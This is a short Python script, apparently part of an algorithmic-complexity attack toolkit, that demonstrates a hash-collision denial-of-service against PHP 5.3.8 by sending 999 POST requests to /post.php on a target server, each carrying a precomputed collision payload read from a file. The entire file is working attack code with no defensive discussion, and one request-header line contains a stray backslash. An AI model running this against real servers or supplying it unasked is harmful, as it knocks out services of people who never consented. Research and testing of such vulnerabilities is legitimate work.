import argparse
import socket


def main(target_ip, target_port, payload_file):
    for i in range(1, 1000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.settimeout(None)
        path = "/post.php"
        with open(payload_file, 'r') as myfile:
            payload = myfile.read()
        payload = '&='.join(payload.split('\n')[:-1])  # ignore empty string from trailing newline
        request = "POST %s HTTP/1.1\r\n\
Host: %s\r\n\
Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\
Connection: Close\r\n\ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3)\r\n\
Content-Length: %s\r\n\
\r\n\
%s\r\n\
\r\n" % (path, target_ip, str(len(payload)), payload)
        sock.send(request.encode('utf-8'))
        print("Sent payload %s" % i)
        sock.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Demonstrate POST hash collision vulnerability against PHP 5.3.8')
    parser.add_argument('ip', help='IP address of the PHP server to target')
    parser.add_argument('port', type=int, help='Port of the PHP server to target')
    parser.add_argument('payload', help='File containing the ACsploit-generated payload')
    args = parser.parse_args()

    main(args.ip, args.port, args.payload)
